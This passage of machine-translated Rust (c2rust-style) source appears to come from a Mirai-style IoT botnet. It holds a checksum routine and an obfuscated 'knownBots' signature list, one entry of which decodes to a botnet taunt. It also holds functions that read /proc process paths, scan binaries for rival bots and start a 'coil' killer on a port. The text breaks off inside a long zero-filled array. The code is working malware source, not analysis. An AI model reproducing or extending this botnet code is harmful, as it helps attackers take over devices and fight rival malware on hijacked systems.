        as uint32_t;
    sum = (sum as libc::c_uint)
        .wrapping_add(
            ip_dst >> 16 as libc::c_int & 0xffff as libc::c_int as libc::c_uint,
        ) as uint32_t as uint32_t;
    sum = (sum as libc::c_uint)
        .wrapping_add(ip_dst & 0xffff as libc::c_int as libc::c_uint) as uint32_t
        as uint32_t;
    sum = (sum as libc::c_uint)
        .wrapping_add(
            (((*iph).protocol as libc::c_ushort as libc::c_int & 0xff as libc::c_int)
                << 8 as libc::c_int
                | ((*iph).protocol as libc::c_ushort as libc::c_int
                    & 0xff00 as libc::c_int) >> 8 as libc::c_int) as libc::c_uint,
        ) as uint32_t as uint32_t;
    sum = (sum as libc::c_uint).wrapping_add(data_len as libc::c_uint) as uint32_t
        as uint32_t;
    while sum >> 16 as libc::c_int != 0 {
        sum = (sum & 0xffff as libc::c_int as libc::c_uint)
            .wrapping_add(sum >> 16 as libc::c_int);
    }
    return !sum as uint16_t;
}
static mut LOOKUP: *const libc::c_uchar = 0 as *const libc::c_uchar;
#[no_mangle]
pub unsafe extern "C" fn hex2bin(
    mut in_0: *const libc::c_char,
    mut len: size_t,
    mut out: *mut libc::c_uchar,
) {
    static mut TBL: [libc::c_uchar; 23] = [
        0 as libc::c_int as libc::c_uchar,
        1 as libc::c_int as libc::c_uchar,
        2 as libc::c_int as libc::c_uchar,
        3 as libc::c_int as libc::c_uchar,
        4 as libc::c_int as libc::c_uchar,
        5 as libc::c_int as libc::c_uchar,
        6 as libc::c_int as libc::c_uchar,
        7 as libc::c_int as libc::c_uchar,
        8 as libc::c_int as libc::c_uchar,
        9 as libc::c_int as libc::c_uchar,
        58 as libc::c_int as libc::c_uchar,
        59 as libc::c_int as libc::c_uchar,
        60 as libc::c_int as libc::c_uchar,
        61 as libc::c_int as libc::c_uchar,
        62 as libc::c_int as libc::c_uchar,
        63 as libc::c_int as libc::c_uchar,
        64 as libc::c_int as libc::c_uchar,
        10 as libc::c_int as libc::c_uchar,
        11 as libc::c_int as libc::c_uchar,
        12 as libc::c_int as libc::c_uchar,
        13 as libc::c_int as libc::c_uchar,
        14 as libc::c_int as libc::c_uchar,
        15 as libc::c_int as libc::c_uchar,
    ];
    let mut end: *const libc::c_char = in_0.offset(len as isize);
    while in_0 < end {
        let fresh91 = in_0;
        in_0 = in_0.offset(1);
        let fresh92 = in_0;
        in_0 = in_0.offset(1);
        let fresh93 = out;
        out = out.offset(1);
        *fresh93 = ((*LOOKUP.offset(*fresh91 as isize) as libc::c_int)
            << 4 as libc::c_int | *LOOKUP.offset(*fresh92 as isize) as libc::c_int)
            as libc::c_uchar;
    }
}
#[no_mangle]
pub static mut knownBots: [*mut libc::c_char; 62] = [
    b"6861692072616E736F6D6520697473206D6520686F70652075206C69656B206D79206E657720626F746E6574\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xCF\x9Ao\xCDo\x9Do\x9Do\xE2\xCFPo*\x86\x86\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\x86\x14*o*\xCFG*\x86\x14*\xCD*\xD0G\xE2*\xE2\x86\x14GG*\xEBGo*\xE2*\x9A*o*\x14*G\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xCD\x9D\xA4\xCD5\x9D\x9D\x14\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"o\x9Do5\xCF\xEB\xCF*oGo\xDAo5o\xDAo\xCFP\x86\xCF*\xCFGo\xDA\xEB\x86\x86\x86\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"o\xDAo\x14o\xDAo\x9Do\x14oG\xCFoo*o\x14\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\x86\xEB\x86\xA4\x86Poo\xCF\xCF\xCFP\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\xCFo\xCF\xE2\xCF\xCFo\x9Do\xEBo\xCDo\xD0\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\xCFPo\xEBo\x9D\x86P\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"G\xA4*\x14*\xDA*\xDA*\xEBG\x86*o\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\xCF\x86o\xCF\xCFPo\x14\xCF\x86\xCFo\x86P\x86\xCFG\xE2\xE2\xA4\0" as *const u8
        as *const libc::c_char as *mut libc::c_char,
    b"*oG*G\x86*\x9A*\xCF*\xDAGP*\xCFG\x86\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*oG*G\x86G\xE2G\xCFGPGP*\x14G\x86Go\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*\xCD*\xD0G\x86*\xEB*\xD0\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*\x86*\xDA*\xEB*o*\xCF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"*o*\xCF*\xCD*\x14*\x9D\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"*\x9A*\x14*\x9A*\x14\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"*\x9A*\xEB*5*\xEB*\xD0\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"G\xE2*\xEBGo*\x14G\x86*\xD0\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*\xCD*\xCFG\xE2G\xE2*\xD0*\xEB*\x9A\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*\xCD*\xD0GPG\xE2\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"*\xCD*\xD0GPG\xE2*\xCF*\xDA\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"G\xE2G\xCFGP*\xCFG\x86*\x9A\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*\xEBG\x86*\xCDG*\xE2G\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"*\xEBG\x86*\xCDG*\xE2*\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"*\xD0\xE2*\xE2\x9A\xE2*\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"GP*\x14GG*\xCFG\x86GP*\xE2\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*\xD0\xE2\xCF\xE2\x9A\xE2*\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*\xCD\xE2*\xE2\x9A*5\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"G\xE2GP*\xEBG\x86*\xE2\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"*\xEBG\x86*\xCDG*\xE2o\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"*\xEBG\x86*\xCDG*\xE2\xCF\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*5*\x14G\xE2*\x9A*\xEB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"G\xD0*\x14G\xD0*\x14\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE2o\xE2o\xE2P**GP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"*\xCD*\xD0*\x14G\x86*\xD0\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*\x9D*\xD0*G*G*\xCFG\x86\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*5*\x14GG*\xEB*\xD0G\xE2Go*\x14G\x86*\xCD\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*\xDA*\x14*\xDA*\x9D*\x14*GGo***\x14\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*\xE2*\x14G\x86*\x14*\x9D*\xEB\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*oG\xCFGPG\xE2\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"*\xCD*\xEBG\xE2G\xCFGo*\xEB\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*\x86*\x14Go*\x9D*\xCFGo\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*\xE2G\x86*\xEB*\xE2*5*\xCF*o\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"G\xE2*\xDAG\xCF*\xCDGP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"G\xE2Go*o***\xDA*\x14*\x14*o\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"G\xCF*oGP***\xDA*\x14*\x14*o\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"Go*\xE2GP***\xDA*\x14*\x14*o\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*\x9AGoGoGP***\xDA*\x14*\x14*o\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*\xE2*\x9A*\xD0*\x9D*\xCFG\xE2*\xCF\x86P***\xEB*\xCD*\xD0*\xDAG\xD0\0" as *const u8
        as *const libc::c_char as *mut libc::c_char,
    b"G*G\xE2GP*\xEBG\x86*5G\xA4G\xD0G\xD0\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"G\xE2*\x9A*\xEB*o*\x14*\x9A\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*\x14G\xE2*\xD0G\x86*\xD0G\xE2\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"*5*\x14GG*\xEB*\xD0\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xD0\xD0\x9A\x14\xD0\x9A\xD0\xDA\x9A\x14\xD0\x9A\xCDP\xDA\xA4\x9A\xD0\x9A*\x9A\xCF\xD0\x14\x9A\x9D\x9A\xDA\x9A*\x9A5\xD0\x9A\x9A\x14\xDAG\x9Ao\x9A\xCD\x9A\xE2\x9Ao\xD0\x86\x9D\xA4\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xCF\xCFG\xE2*\xCFG\x86\x86\xCDo\xEB*G*\xCF*\x9DGo\xE2\xA4\x86P\x86\xCFG\xE2\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"o\x14o\xCD\xCF*o\xA4oG\xCFP\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"oo\xCFGo\xEBo\xD0oG\xCFP\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"o\x9A\xCF\xCFo\xEB\xCFGo\xCFo\xD0\xCF\xCF\xCFPo\x9D\xCFP\0" as *const u8
        as *const libc::c_char as *mut libc::c_char,
    b"\xCFPo\x14o\x9DoG\x86Po\x9Do\xD0oGoGo\xEB\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\xCFPo\x14\xCF\xE2\xCFo\x86P\x86\x14*\xE2GoG\x86*\xDAGo\x86\x14oo*\xCFG**\xD0*\xE2*\xCF\xCF\xCFGP*GG\x86*\xEB*o*\xCF\xCF\x14\xE2\xEB\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"*o*\xEBGo*\xEB*GG\x86*\xEB*\xCD\x86P*\xDA*\xD0G\xE2Go*\xCF*\x9D*\xCFG\x86\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
];
#[no_mangle]
pub unsafe extern "C" fn mem_exists(
    mut buf: *mut libc::c_char,
    mut buf_len: libc::c_int,
    mut str: *mut libc::c_char,
    mut str_len: libc::c_int,
) -> libc::c_int {
    let mut matches: libc::c_int = 0 as libc::c_int;
    if str_len > buf_len {
        return 0 as libc::c_int;
    }
    loop {
        let fresh94 = buf_len;
        buf_len = buf_len - 1;
        if !(fresh94 != 0) {
            break;
        }
        let fresh95 = buf;
        buf = buf.offset(1);
        if *fresh95 as libc::c_int == *str.offset(matches as isize) as libc::c_int {
            matches += 1;
            if matches == str_len {
                return 1 as libc::c_int;
            }
        } else {
            matches = 0 as libc::c_int;
        }
    }
    return 0 as libc::c_int;
}
#[no_mangle]
pub static mut coil_pid: libc::c_int = 0;
#[no_mangle]
pub static mut coil_exe: *mut libc::c_char = 0 as *const libc::c_char
    as *mut libc::c_char;
#[no_mangle]
pub static mut coil_exe_len: libc::c_int = 0 as libc::c_int;
#[no_mangle]
pub unsafe extern "C" fn aiuf() -> libc::c_int {
    let mut path: [libc::c_char; 4096] = [0; 4096];
    let mut ptr_path: *mut libc::c_char = path.as_mut_ptr();
    let mut tmp: [libc::c_char; 16] = [0; 16];
    let mut fd: libc::c_int = 0;
    let mut k_rp_len: libc::c_int = 0;
    ptr_path = ptr_path
        .offset(
            util_strcpy(
                ptr_path,
                eika(
                    b"'\xA0\xE7\xB9\xCE'\0" as *const u8 as *const libc::c_char
                        as *mut libc::c_char,
                ),
            ) as isize,
        );
    ptr_path = ptr_path
        .offset(
            util_strcpy(
                ptr_path,
                util_itoa(getpid(), 10 as libc::c_int, tmp.as_mut_ptr()),
            ) as isize,
        );
    ptr_path = ptr_path
        .offset(
            util_strcpy(
                ptr_path,
                eika(
                    b"'Q\xC1Q\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
                ),
            ) as isize,
        );
    fd = open(path.as_mut_ptr(), 0 as libc::c_int);
    if fd == -(1 as libc::c_int) {
        return 0 as libc::c_int;
    }
    close(fd);
    k_rp_len = readlink(
        path.as_mut_ptr(),
        coil_exe,
        (4096 as libc::c_int - 1 as libc::c_int) as size_t,
    ) as libc::c_int;
    if k_rp_len != -(1 as libc::c_int) {
        *coil_exe.offset(k_rp_len as isize) = 0 as libc::c_int as libc::c_char;
    }
    util_zero(
        path.as_mut_ptr() as *mut libc::c_void,
        ptr_path.offset_from(path.as_mut_ptr()) as libc::c_long as libc::c_int,
    );
    return 1 as libc::c_int;
}
#[no_mangle]
pub unsafe extern "C" fn d8ds(mut path: *mut libc::c_char) -> libc::c_int {
    let mut fd: libc::c_int = 0;
    let mut ret: libc::c_int = 0;
    let mut rdbuf: [libc::c_char; 4096] = [0; 4096];
    let mut found: libc::c_int = 0 as libc::c_int;
    let mut i_0: libc::c_int = 0;
    fd = open(path, 0 as libc::c_int);
    if fd == -(1 as libc::c_int) {
        return 0 as libc::c_int;
    }
    let mut searchFor: [libc::c_uchar; 64] = [0; 64];
    util_zero(
        searchFor.as_mut_ptr() as *mut libc::c_void,
        ::std::mem::size_of::<[libc::c_uchar; 64]>() as libc::c_ulong as libc::c_int,
    );
    loop {
        ret = read(
            fd,
            rdbuf.as_mut_ptr() as *mut libc::c_void,
            ::std::mem::size_of::<[libc::c_char; 4096]>() as libc::c_ulong,
        ) as libc::c_int;
        if !(ret > 0 as libc::c_int) {
            break;
        }
        i_0 = 0 as libc::c_int;
        while (i_0 as libc::c_ulong)
            < (::std::mem::size_of::<[*mut libc::c_char; 62]>() as libc::c_ulong)
                .wrapping_div(
                    ::std::mem::size_of::<*mut libc::c_char>() as libc::c_ulong,
                )
        {
            hex2bin(
                eika(knownBots[i_0 as usize]),
                util_strlen(knownBots[i_0 as usize]) as size_t,
                searchFor.as_mut_ptr(),
            );
            if mem_exists(
                rdbuf.as_mut_ptr(),
                ret,
                searchFor.as_mut_ptr() as *mut libc::c_char,
                util_strlen(searchFor.as_mut_ptr() as *mut libc::c_char),
            ) != 0
            {
                found = 1 as libc::c_int;
                break;
            } else {
                util_zero(
                    searchFor.as_mut_ptr() as *mut libc::c_void,
                    ::std::mem::size_of::<[libc::c_uchar; 64]>() as libc::c_ulong
                        as libc::c_int,
                );
                i_0 += 1;
            }
        }
    }
    close(fd);
    return found;
}
#[no_mangle]
pub unsafe extern "C" fn coil_start(mut port: uint16_t) -> libc::c_int {
    let mut dir: *mut DIR = 0 as *mut DIR;
    let mut fd_dir: *mut DIR = 0 as *mut DIR;
    let mut entry: *mut dirent = 0 as *mut dirent;
    let mut fd_entry: *mut dirent = 0 as *mut dirent;
    let mut path: [libc::c_char; 4096] = [
        0 as libc::c_int as libc::c_char,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
